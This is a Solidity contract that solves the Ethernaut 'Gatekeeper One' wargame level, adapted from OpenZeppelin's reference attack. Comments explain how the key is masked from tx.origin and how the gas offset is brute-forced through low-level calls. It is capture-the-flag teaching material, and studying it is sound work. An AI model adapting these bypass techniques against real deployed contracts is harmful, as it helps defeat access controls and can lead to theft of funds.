pragma solidity ^0.8.0;

//Based on https://github.com/OpenZeppelin/ethernaut/blob/403145fb00d9538fda79e95d06022824ca9f9304/contracts/attacks/GatekeeperOneAttack.sol, yes, I had to look it up for this one :D
// I tried to expand a bit on the mask explanation (as the code also didnt work for me)
contract GatekeeperOneAttack {
    address GatekeeperOneContractAddress;
    bytes encodedParams;

    constructor(address _GatekeeperOneContractAddress) {
        bytes8 key = bytes8(uint64(uint160(tx.origin)));

        // Explanation of the mask. When I'm enumerating bytes and hexadecimal numbers (be aware of the difference!) I start the count from the right most value.
        // For condition 1: Needs bytes 3 and 4 to be 0 ((i.e. hexadecimal numbers 5 - 8  need to be 0, counted from the right)),
        // as they will be truncated on the right side and the comparison still has to hold
        // For condition 2: We need a non-zero-value anywhere in the the bytes 5-8 (e.g. hexanumbers 9-16), as the 64 bit cast has to differ from the 32 bit cast (the 32 bit cast zeroes out hexanumbers 9-16)
        // For condition 3: last 2 bytes (i.e. last 4 hexanumbers) of origin-address required by condition 3,
        bytes8 maskedKey = key & 0xF00000000000FFFF;
        GatekeeperOneContractAddress = _GatekeeperOneContractAddress;
        // NOTE: the proper gas offset to use will vary depending on the compiler
        // version and optimization settings used to deploy the factory contract.
        // To migitage, brute-force a range of possible values of gas to forward.
        // Using call (vs. an abstract interface) prevents reverts from propagating.
        encodedParams = abi.encodeWithSignature(("enter(bytes8)"), maskedKey);
    }

    function pwn(uint256 startIndex, uint256 endIndex) public {
        // The author of the codebase found out that the gas offset usually comes in around 210 (i.e. when i = 210 in my code), but give a buffer of your choosing on each side
        // (i.e. startIndex=150  and endIndex=270 would be a buffer of 60 on each side)
        // I adjusted the buffer to be parameter-based
        // If we would not know that the result is around 210, we would have to iterate over up to 8191 (0-8190) values of i.

        for (uint256 i = startIndex; i < endIndex; i++) {
            (bool result, bytes memory data) = address(
                GatekeeperOneContractAddress
            ).call{gas: i + 8191 * 3}(encodedParams);
            if (result) {
                break;
            }
        }
    }
}
